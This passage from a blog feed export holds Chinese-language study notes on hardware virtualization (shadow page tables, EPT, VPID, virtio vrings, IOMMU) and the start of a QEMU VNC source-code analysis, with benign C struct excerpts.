寄存器（存放页顶级表指针）的操作是敏感指令，我们的 Hypervisor 可以很轻易地截获 VM 的这个操作，<strong>并将页表替换为存放 GVA→HPA 映射关系的影子页表</strong>，这样就能<strong>直接完成由 GVA 到 HPA 的转换过程</strong></p><p><img src="https://s2.loli.net/2022/08/05/eG1hpBbZy6Edszg.png" alt="image.png"></p><p>为了实现影子页表，我们本质上需要实现<strong>MMU 虚拟化</strong>：</p><ul><li>Guest VM 所能看到与操作的实际都上是虚拟的 MMU，真正载入 MMU 的页表是由 Hypevisor 完成翻译后所产生的<strong>影子页表</strong></li><li>影子页表中的访问权限为<strong>只读的</strong>，当 Guest 想要读写页表时便能被 Hypervisor 捕获到这个操作并代为处理</li></ul><p>不过这种方法的缺点就是<strong>我们需要为 Guest VM 中的每套页表都独立维护一份影子页表，且需要多次在 VMM 与 VM 间进行切换，这具有一定的开销</strong></p><h2 id="二、硬件辅助虚拟化">二、硬件辅助虚拟化</h2><h3 id="III-扩展页表（Extend-Page-Table-EPT）">III.扩展页表（Extend Page Table, EPT）</h3><p>从软件层面似乎已经是难以有更好的优化的方案了，因此硬件层面的对内存虚拟化的支持便应运而生——<strong>EPT</strong> 即 <strong>Extend Page Table</strong>，是 Intel 为实现内存虚拟化而新增的特性，目的是为了减少内存访问的开销</p><p>EPT 并不干扰 Guest VM 操作自身页表的过程，其本质上是<strong>额外提供了一个 Guest 物理地址空间到 Host 物理地址空间转换的页表</strong>，即使用一个额外的页表来完成 <code>GPA→HPA</code> 的转换</p><p>EPT 方案虽然相比起影子页表而言多了一层转换，但是并不需要干扰 Guest 原有的页表管理，<strong>GVA→GPA→HPA 的过程都由硬件自动完成</strong>，同时 Hypervisor 仅需要截获 <code>EPT Violation</code> 异常（EPT 表项为空），效率提高了不少</p><p><img src="https://s2.loli.net/2022/08/05/BSjJk3zq6ayrXvO.png" alt="image.png"></p><h3 id="IV-VPID：TLB-资源优化">IV. VPID：TLB 资源优化</h3><p><strong>Translation Lookaside Buffer</strong>为用以加快虚拟地址到物理地址转换的<strong>页表项缓存</strong>，当进行地址转换时 CPU 首先会先查询 TLB，TLB 根据虚拟地址查找是否存在对应的 cache，若 cache miss 了才会查询页表</p><p>由于 TLB 是与对应的页表进行工作的，因此在切换页表时 TLB 原有的内容就失效了，此时我们应当使用 <code>INVLPG</code> 使 TLB 失效，类似地，在 VM-Entry 与 VM-Exit 时 CPU 都会强制让 TLB 失效，但这么做仍存在一定的性能损耗</p><p><strong>Virtual Processor Identifier</strong>（VPID）则是一种硬件级的对 TLB 资源管理的优化，其在硬件上为每个 TLB 表项打上一个 VPID 标识（VMM 为每个 vCPU 分配一个唯一的 VPID，存放在 VMCS 中，逻辑 CPU 的 VPID 为 0），在 CPU 查找 TLB cache 时会先比对 VPID，这样我们就无需在每次进行 VM entry/exit 时刷掉所有的 cache，而可以继续复用之前保留的 cache</p><h1>0x06. I/O 虚拟化</h1><p>现实的外设资源往往是有限的，同时我们有的时候并不需要让 VM 直接接触到现实存在的外设资源，有的时候我们还想为 VM 提供一些不存在实体设备的设备，因此 Hypervisor 需要通过 IO 虚拟化的方式来为 VM 提供<strong>虚拟的设备资源</strong></p><p>从处理器的角度而言，我们与外设之间的交互主要是通过 <code>MMIO</code> 与 <code>Port IO</code> 来完成的，因而针对外设的虚拟化称之为 <strong>I/O 虚拟化</strong></p><p>I/O 虚拟化需要实现以下三个任务：</p><ul><li>访问截获：Hypervisor 需要截获 VM 对外设的访问操作</li><li>提供设备接口：Hypervisor 需要为 VM 提供虚拟/直通设备的接口</li><li>实现设备功能：Hypervisor 需要实现虚拟设备的功能</li></ul><h2 id="一、I-O-虚拟化基本模型">一、I/O 虚拟化基本模型</h2><blockquote><p>这一节其实是笔者不记得不知道什么时候出于什么目的从<a href="https://developer.ibm.com/tutorials/l-pci-passthrough/">https://developer.ibm.com/tutorials/l-pci-passthrough/</a>上翻译了一段存在草稿箱里，最近翻草稿箱发现之前居然还留存有这种东西，所以修改一下就放上来了XD</p></blockquote><h3 id="I-平台设备模拟（Platform-device-emulation）">I.平台设备模拟（Platform device emulation）</h3><p>QEMU 和 VMWare 都选择了仿真出一个虚拟设备，不同在于其模拟设备的实现方式。</p><h4 id="基于虚拟机管理程序的设备模拟（Hypervisor-based-device-emulation）">基于虚拟机管理程序的设备模拟（Hypervisor-based device emulation）</h4><p>在 hypervisor （虚拟机管理程序）中对设备进行仿真是 VMware workstation 系列产品较为常用的一种方式：在 hypervisor 中有着对一般设备的仿真供 guest OS 进行共享，包括虚拟磁盘、虚拟网络适配器与其他的必要元素，这种模型如下图所示：</p><p><img src="https://s2.loli.net/2022/02/25/IQduvSe7wE4TLgq.png" alt="image.png"></p><h4 id="在用户空间进行设备模拟（User-space-device-emulation）">在用户空间进行设备模拟（User space device emulation）</h4><p>第二种架构称为用户空间设备模拟，正如其名，相比于在 hypervisor 中进行模拟，其选择了在用户空间进行模拟的方式。QEMU（不仅提供了设备模拟同时还有一个 hypervisor）在用户空间中独立模拟了一个设备，该模拟设备被其他的 VM 通过 hypervisor 提供的接口进行调用。由于设备的模拟是独立于 hypervisor 的，因此我们可以模拟任何设备，且该模拟设备可以在其他 hypervisor 间进行共享。</p><p><img src="https://s2.loli.net/2022/02/28/IQbMNCcDlXR4z5V.png" alt="image.png"></p><h3 id="II-设备直通（Device-passthrough）">II.设备直通（Device passthrough）</h3><p>上面的这两种模型或多或少都存在着一定的性能开销，如果该设备需要被多个 VM 共享，那这种开销或许是值得的，但如果该设备并不需要共享，那么我们其实可以使用一种更为高效的方法——设备直通（Device passthrough）。</p><h4 id="通过虚拟机管理程序进行直通（Passthrough-within-the-hypervisor）">通过虚拟机管理程序进行直通（Passthrough within the hypervisor）</h4><p>设备直通可以理解为设备独占的设备模拟：直接将设备<strong>隔离</strong>给到指定的 VM 上，以便该设备可以由该 VM 独占使用。<strong>这提供了接近于原生设备的性能</strong>，例如对于一些需要大量 IO 的设备（例如网络设备等），使用设备直通能提供相当完美的性能。</p><p>下图左半部分便为设备直通</p><p><img src="https://s2.loli.net/2022/02/28/PRSNK1g4saEjvVF.png" alt="image.png"></p><h2 id="二、软件半虚拟化-virtio">二、软件半虚拟化 - virtio</h2><p><code>virtio</code> 这个概念来自于一篇非常古老的虚拟化领域的论文：<a href="https://ozlabs.org/~rusty/virtio-spec/virtio-paper.pdf">virtio: towards a de-facto standard for virtual I/O devices</a>，主要是为了解决设备虚拟化的问题而<strong>提供了一套通用的虚拟化设备模型</strong>，Guest OS 只需要实现一套统一的 virtio 驱动便能以统一的方式访问虚拟化设备，从而避免了各种虚拟化驱动分裂的问题</p><p><img src="https://s2.loli.net/2022/08/29/SZ2p17EtqRHoFQh.png" alt="image.png"></p><h3 id="I-VirtQueue：传输层抽象">I. VirtQueue：传输层抽象</h3><p><code>virtqueue</code> 为 virtio 中用以进行数据传输的关键结构，其本身表示一个<strong>数据队列</strong>：由一方向队列中添加 buffer，另一方从队列中取出 buffer——通过这样的方式实现了 Guest 与 Host 之间基本的数据传输模型</p><p>为了减少模型的复杂性，通常我们使用 virtqueue 的传输都是单向的，因此一个最简单的模型就是我们就可以使用两个 virtqueue 来实现 Guest 与 Host 之间的双向通信：tx queue（发送队列） &amp; rx queue（接收队列）</p><p><img src="https://s2.loli.net/2022/08/29/g1kn2r4VWO7GBLM.png" alt="转自 LoyenWang 公众号的图片，非常清晰的表示了 virtqueue 工作原理的一张图！"></p><p>对于 virtqueue 的操作，在论文中抽象成一个函数表 <code>virtqueue_ops</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtqueue_ops</span> &#123;</span><br>    <span class="hljs-type">int</span> (*add_buf)(<span class="hljs-keyword">struct</span> virtqueue *vq,<br>                    <span class="hljs-keyword">struct</span> scatterlist sg[],<br>                    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> out_num,<br>                    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> in_num,<br>                    <span class="hljs-type">void</span> *data);<br>    <span class="hljs-type">void</span> (*kick)(<span class="hljs-keyword">struct</span> virtqueue *vq);<br>    <span class="hljs-type">void</span> *(*get_buf)(<span class="hljs-keyword">struct</span> virtqueue *vq,<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *len);<br>    <span class="hljs-type">void</span> (*disable_cb)(<span class="hljs-keyword">struct</span> virtqueue *vq);<br>    <span class="hljs-type">bool</span> (*enable_cb)(<span class="hljs-keyword">struct</span> virtqueue *vq);<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><code>add_buf</code>：向 virtqueue 中添加一个 buffer</li><li><code>kick</code> ：通知另一方新到达了一个 buffer</li><li><code>get_buf</code> 从 virtqueue 中获取一个 buffer</li><li><code>disable_cb</code>：通知另一方关闭 buffer 到达的提示</li><li><code>enable_cb</code>：通知另一方开启 buffer 到达的提示</li></ul><h3 id="II-VRing：virtqueue-的基本结构">II. VRing：virtqueue 的基本结构</h3><p>virtqueue 核心的数据结构便是 <code>vring</code>，这是一个<strong>环形缓冲区队列</strong>，其由三部分组成：</p><ul><li>描述符表（Desc）</li><li>可用描述符数组（Used）</li><li>已用描述符数组（Avail）</li></ul><p><img src="https://s2.loli.net/2022/08/29/OrlAvYaFkZ3dIXt.png" alt="image.png"></p><p>一个描述符（Descriptor）为如下结构，表示了一块 buffer 的基本属性，需要注意的是一个 Avail/Used 表项通常是多个 descriptor 串联的 buffer——这便是 next 域的作用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vring_desc</span></span><br><span class="hljs-class">&#123;</span><br>    __u64 addr;<span class="hljs-comment">// Guest Physical Addresses</span><br>    __u32 len;<span class="hljs-comment">// 长度</span><br>    __u16 flags;<span class="hljs-comment">// 属性</span><br>    __u16 next;<span class="hljs-comment">// 下一个描述符的 idx</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>Avail</strong> 数组用来存储当前可用的描述符：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vring_avail</span></span><br><span class="hljs-class">&#123;</span><br>    __u16 flags;<br>    __u16 idx;<br>    __u16 ring[NUM];<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>Used</strong> 数组则用来存储已经被使用的描述符：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vring_used_elem</span></span><br><span class="hljs-class">&#123;</span><br>    __u32 id;<br>    __u32 len;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vring_used</span></span><br><span class="hljs-class">&#123;</span><br>    __u16 flags;<br>    __u16 idx;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vring_used_elem</span> <span class="hljs-title">ring</span>[];</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>Avail 数组与 Used 数组同样是一个<strong>环形队列</strong>，不过这两个数组分别由通信的两方进行使用：</p><ul><li>数据<strong>发送方</strong>准备好数据后从 <code>Avail 队列</code> 中获取可用的表项，更新描述符表，并在 <code>Used 队列</code> 中插入新的表项，通知接收方有数据到达</li><li>数据<strong>接收方</strong>从 <code>Used 队列</code> 中取出表项，读取描述符表以获取数据，完成处理后将表项插入到 <code>Avail 队列</code> 中</li></ul><p>下图为由 Guest 向 Host 发送数据的一个 vring 示例：</p><p><img src="https://s2.loli.net/2022/08/29/8uUq1jacyEYGlXR.png" alt="转自 LoyenWang 公众号的图片，非常清晰的表示了 virtqueue 工作原理的一张图！"></p><h3 id="III-virtio-配置操作抽象">III. virtio 配置操作抽象</h3><p>结合 virtqueue，我们现在可以抽象出一个虚拟 PCI 设备的基本操作：</p><ul><li>获取 feature bits</li><li>读写配置空间</li><li>读写 status bits</li><li>设备重置</li><li>创建/销毁 virtqueue</li></ul><p>我们将其抽象成一张函数表：<code>virtio_config_ops</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_config_ops</span></span><br><span class="hljs-class">&#123;</span><br>        <span class="hljs-type">bool</span> (*feature)(<span class="hljs-keyword">struct</span> virtio_device *vdev, <span class="hljs-type">unsigned</span> bit);<br>        <span class="hljs-type">void</span> (*get)(<span class="hljs-keyword">struct</span> virtio_device *vdev, <span class="hljs-type">unsigned</span> offset,<br>                    <span class="hljs-type">void</span> *buf, <span class="hljs-type">unsigned</span> len);<br>        <span class="hljs-type">void</span> (*<span class="hljs-built_in">set</span>)(<span class="hljs-keyword">struct</span> virtio_device *vdev, <span class="hljs-type">unsigned</span> offset,<br>                    <span class="hljs-type">const</span> <span class="hljs-type">void</span> *buf, <span class="hljs-type">unsigned</span> len);<br>        u8 (*get_status)(<span class="hljs-keyword">struct</span> virtio_device *vdev);<br>        <span class="hljs-type">void</span> (*set_status)(<span class="hljs-keyword">struct</span> virtio_device *vdev, u8 status);<br>        <span class="hljs-type">void</span> (*reset)(<span class="hljs-keyword">struct</span> virtio_device *vdev);<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtqueue</span> *(*<span class="hljs-title">find_vq</span>)(<span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_device</span> *<span class="hljs-title">vdev</span>,</span><br><span class="hljs-class">                                     <span class="hljs-title">unsigned</span> <span class="hljs-title">index</span>,</span><br><span class="hljs-class">                                     <span class="hljs-title">void</span> (*<span class="hljs-title">callback</span>)(<span class="hljs-keyword">struct</span> <span class="hljs-title">virtqueue</span> *));</span><br>        <span class="hljs-type">void</span> (*del_vq)(<span class="hljs-keyword">struct</span> virtqueue *vq);<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><code>feature</code>：获取设备对应的 feature bit</li><li><code>get &amp; set</code> ：读写设备的配置空间</li><li><code>get_status &amp; set_status</code>：读写设备的 status bits</li><li><code>reset</code>：重置设备</li><li><code>find_vq</code>：获取/创建 virtqueue</li><li><code>del_vq</code>：销毁 virtqueue</li></ul><h2 id="三、IOMMU">三、IOMMU</h2><blockquote><p>可以直接参见 <a href="https://www.intel.com/content/dam/develop/external/us/en/documents/intel-whitepaper-using-iommu-for-dma-protection-in-uefi.pdf">Intel 的手册</a></p></blockquote><p>IOMMU 即 <strong>Input/Output Memory Management Unit</strong>，其功能类似于 CPU 中的 MMU，是一个<strong>向设备侧提供地址翻译功能的单元</strong></p><p><img src="https://s2.loli.net/2022/09/03/3GOTl4oAExSdPcL.png" alt="image.png"></p><p>IOMMU 通常被集成于北桥中，其提供面向设备端的两个功能：</p><ul><li><strong>DMA 重映射</strong>（ <strong>DMA remapping</strong>）：有着 DMA 功能的设备可以使用虚拟地址，通过 IOMMU 转换为物理地址进行直接内存访问</li><li><strong>中断重映射</strong>（<strong>Interrupt remapping</strong>）：IOMMU 会拦截设备产生的中断，根据中断重映射表产生新的中断请求发送给 LAPIC</li></ul><p><img src="https://s2.loli.net/2022/09/03/k8mOSalVRWtseMi.png" alt="image.png"></p><h3 id="I-DMA-重映射">I. DMA 重映射</h3><p>DMA 重映射即面向设备侧的地址访问重翻译，如下图所示，左侧是 CPU 对内存的虚拟化：MMU 利用进程页表将进程要访问的虚拟地址翻译为物理地址，从而实现在两个进程中访问同一个虚拟地址实际上访问到不同的物理地址——DMA 重映射也是类似的原理，如下图右侧所示，当外设想要进行 DMA 时，IOMMU 会根据“设备页表”进行地址翻译，从而使得两个设备各自感知访问的是同一个地址，但实际上访问到了不同的物理地址</p><p><img src="https://s2.loli.net/2022/09/03/B3yxUoClVsArMGp.png" alt="image.png"></p><p>DMA 重映射有着以下的两种方式：</p><h4 id="①-Request-without-PASID">① Request-without-PASID</h4><p>在 IOMMU 中使用了一个“二层页表 + 标准页表”结构来实现 DMA 重映射，需要占用部分物理内存空间：</p><ul><li><strong>Root Table</strong>：存放各个 bus 的 DMA 重映射表地址，一个 entry 对应一个 bus</li><li><strong>Context Table</strong>：存放各个 domain 的 DMA 重映射表地址，一个 entry 对应一个 domain</li><li><strong>Address Translation Structure</strong>：实际的 DMA 重映射页表</li></ul><p>在 IOMMU 中的寄存器 <strong>Root Table Address Register</strong> 用以存放指向 Root-table 的指针</p><p><img src="https://s2.loli.net/2022/09/03/TdAB3Um4xhzHKXZ.png" alt="image.png"></p><p>DMA 重映射还需要一个 id 来唯一标识一个设备，对于 PCI 设备而言便是其 BDF（Bus/Device/Function），因此实际的地址访问过程如下图所示：</p><p><img src="https://s2.loli.net/2022/09/03/67FPkW2zafeMBpL.png" alt="知乎偷的图"></p><h4 id="②-Request-with-PASID">② Request-with-PASID</h4><h3 id="II-中断重映射">II.中断重映射</h3><h3 id="III-IOMMU-与虚拟化">III. IOMMU 与虚拟化</h3><p>虽然 IOMMU 的引入增加了与外设通信间的开销，但 IOMMU 解决了系统虚拟化技术的一个难点：对于非纯模拟的设备而言，其并不知道 GPA 与 HPA 之间的映射关系，当其按 Guest OS 提供的地址进行 DMA 时<strong>会直接访问到 Host 的内存</strong></p><p>当引入了 IOMMU 之后，IOMMU 可以根据 Host 侧提供的 GPA 到 HPA 之间的地址转换表，进行<strong>DMA remapping</strong>，这样外设就能正常地访问到 Guest 的物理内存，而不会错误地访问到 Host 对应的物理内存区域</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;虚拟化方向YLG速成入门指北&lt;/p&gt;</summary>
    
    
    
    <category term="VIRTUALIZATION" scheme="http://blog.arttnba3.cn/categories/VIRTUALIZATION/"/>
    
    
    <category term="学习札记" scheme="http://blog.arttnba3.cn/tags/%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/"/>
    
    <category term="虚拟化" scheme="http://blog.arttnba3.cn/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>【VIRT.0x01】Qemu - II：VNC 模块源码分析</title>
    <link href="http://blog.arttnba3.cn/2022/07/22/VIRTUALIZATION-0X01-QEMU-PART-II/"/>
    <id>http://blog.arttnba3.cn/2022/07/22/VIRTUALIZATION-0X01-QEMU-PART-II/</id>
    <published>2022-07-21T17:39:15.000Z</published>
    <updated>2022-08-19T16:32:23.907Z</updated>
    
    <content type="html"><![CDATA[<p>vnc，🐕都不用</p><span id="more"></span><h1>0x00.一切开始之前</h1><p>VNC 即 Virtual Network Computing，是基于**RFB（Remote Frame Buffer）**协议进行通信的远程桌面协议，与 telnet、ssh 等相比，VNC 最大的特点便是支持图形化了，用户可以看到远程机器的图形化界面，且能使用键盘与鼠标进行输入</p><p>Qemu 虚拟机同样支持通过 VNC只需要指定 <code>-vnc</code> 参数便能够建立 VNC Server，从而使得远程用户可以通过 VNC 连接到 Qemu 虚拟机上</p><p>本篇主要是对 Qemu 中 VNC 实现的源码分析，同时也会夹杂着部分 Qemu 显示相关的分析，源码版本 Qemu 7.0.0</p><h1>0x01. qemu_init_displays() - 显示设备初始化</h1><p>我们都知道 Qemu 的入口函数是 <code>softmmu/main.c</code> 中的 <code>qemu_main()</code>，在其中会调用到 <code>sotftmmuvl.c</code> 中的 <code>qemu_init()</code> 函数进行 Qemu 的初始化工作，包括一系列的参数解析、设备初始化等</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">undef</span> main</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> main qemu_main</span><br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    qemu_init(argc, argv, envp);<br>    qemu_main_loop();<br>    qemu_cleanup();<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>本篇我们主要关注与 VNC 相关的内容，注意到在 <code>qemu_init()</code> 的末尾会调用到 <code>qemu_init_displays()</code> 进行显示初始化的工作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">qemu_init</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br><br>    qemu_init_displays();<br>    <br>    <span class="hljs-comment">//...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>这个函数比较简短，首先是调用 <code>init_displaystate()</code> 与 <code>qemu_display_init()</code> 对虚拟机本地的显示设备进行初始化，之后才是使用 <code>qemu_opts_foreach</code> 宏来遍历参数中与 vnc 相关的配置，最后调用到的是 <code>vnc_init_func()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">qemu_init_displays</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    DisplayState *ds;<br><br>    <span class="hljs-comment">/* 初始化本地显示 */</span><br>    ds = init_displaystate();<br>    qemu_display_init(ds, &amp;dpy);<br><br>    <span class="hljs-comment">/* 必须在终端初始化后, 由 SDL 库更改信号的 handlers */</span><br>    os_setup_signal_handling();<br><br>    <span class="hljs-comment">/* 初始化远程显示 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_VNC</span><br>    qemu_opts_foreach(qemu_find_opts(<span class="hljs-string">&quot;vnc&quot;</span>),<br>                      vnc_init_func, <span class="hljs-literal">NULL</span>, &amp;error_fatal);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <span class="hljs-keyword">if</span> (using_spice) &#123;<br>        qemu_spice.display_init();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="〇、显示设备相关结构体">〇、显示设备相关结构体</h2><p>在 Qemu 当中有着多个与显示设备相关的结构，他们之间的关系如下图所示：</p><p><img src="https://s2.loli.net/2022/07/20/FUkehDzTocbtu4O.png" alt="image.png"></p><blockquote><p>本图来自于<a href="https://www.linux-kvm.org/images/b/b2/01x10b-QEMUGfraphics.pdf">这个ppt</a></p></blockquote><h3 id="I、QemuConsole-单个控制台实例">I、QemuConsole - 单个控制台实例</h3><p>在开始分析之前我们先介绍一个新的结构体：<code>QemuConsole</code>，一个该结构体实例在 Qemu 中表示一个控制台（console）实例，对应着<strong>一个特定的 VGA 设备与一组特定的输入设备</strong>。在 Qemu 当中主要有两类控制台：图形化控制台与字符型控制台。</p><p>该结构体定义于 <code>ui/console.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">QemuConsole</span> &#123;</span><br>    Object parent;<br><br>    <span class="hljs-type">int</span> index;<br>    <span class="hljs-type">console_type_t</span> console_type; <span class="hljs-comment">// 控制台类型</span><br>    DisplayState *ds;           <span class="hljs-comment">// 对应的显示设备</span><br>    DisplaySurface *surface;<br>    DisplayScanout scanout;<br>    <span class="hljs-type">int</span> dcls;<br>    DisplayGLCtx *gl;<br>    <span class="hljs-type">int</span> gl_block;<br>    QEMUTimer *gl_unblock_timer;<br>    <span class="hljs-type">int</span> window_id;<br><br>    <span class="hljs-comment">/* 图形化控制台状态.  */</span><br>    Object *device; <span class="hljs-comment">// 对应的图形化设备</span><br>    <span class="hljs-type">uint32_t</span> head;<br>    QemuUIInfo ui_info;<br>    QEMUTimer *ui_timer;  <span class="hljs-comment">// 对应的 Timer</span><br>    <span class="hljs-type">const</span> GraphicHwOps *hw_ops;  <span class="hljs-comment">// 硬件操作函数</span><br>    <span class="hljs-type">void</span> *hw;<br><br>    <span class="hljs-comment">/* 字符控制台状态 */</span><br>    <span class="hljs-type">int</span> width;<br>    <span class="hljs-type">int</span> height;<br>    <span class="hljs-type">int</span> total_height;<br>    <span class="hljs-type">int</span> backscroll_height;<br>    <span class="hljs-type">int</span> x, y;<br>    <span class="hljs-type">int</span> x_saved, y_saved;<br>    <span class="hljs-type">int</span> y_displayed;<br>    <span class="hljs-type">int</span> y_base;<br>    TextAttributes t_attrib_default; <span class="hljs-comment">/* 默认字符属性 */</span><br>    TextAttributes t_attrib; <span class="hljs-comment">/* 当前活动字符属性 */</span><br>    TextCell *cells;<br>    <span class="hljs-type">int</span> text_x[<span class="hljs-number">2</span>], text_y[<span class="hljs-number">2</span>], cursor_invalidate;<br>    <span class="hljs-type">int</span> echo;<br><br>    <span class="hljs-type">int</span> update_x0;<br>    <span class="hljs-type">int</span> update_y0;<br>    <span class="hljs-type">int</span> update_x1;<br>    <span class="hljs-type">int</span> update_y1;<br><br>    <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">TTYState</span> <span class="hljs-title">state</span>;</span><br>    <span class="hljs-type">int</span> esc_params[MAX_ESC_PARAMS];<br>    <span class="hljs-type">int</span> nb_esc_params;<br><br>    Chardev *chr;<br>    <span class="hljs-comment">/* 先进先出的按键输入 */</span><br>    Fifo8 out_fifo;<br>    CoQueue dump_queue;<br><br>    QTAILQ_ENTRY(QemuConsole) next;<br>&#125;;<br></code></pre></td></tr></table></figure><p>对于图形化设备相关的操作，主要通过函数表 <code>hw_ops</code> 来完成，对于纯字符型显示设备而言，该函数表为 <code>text_console_ops</code>，对于普通的 VGA 设备而言则为 <code>vga_ops</code>，我们在后面会看到这一点。</p><p>QemuConsole 的创建主要通过 <code>new_console()</code> 来完成，在 Qemu 中有一个全局的 QemuConsole 变量 <code>consoles</code>，每当创建一个新的 QemuConsole 后就会通过尾插法插入到这个全局的 QemuConsole 链表中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-title function_">QTAILQ_HEAD</span><span class="hljs-params">(, QemuConsole)</span> consoles =<br>    QTAILQ_HEAD_INITIALIZER(consoles);<br></code></pre></td></tr></table></figure><blockquote><p>什么是 <code>console</code>？狭义地说，console 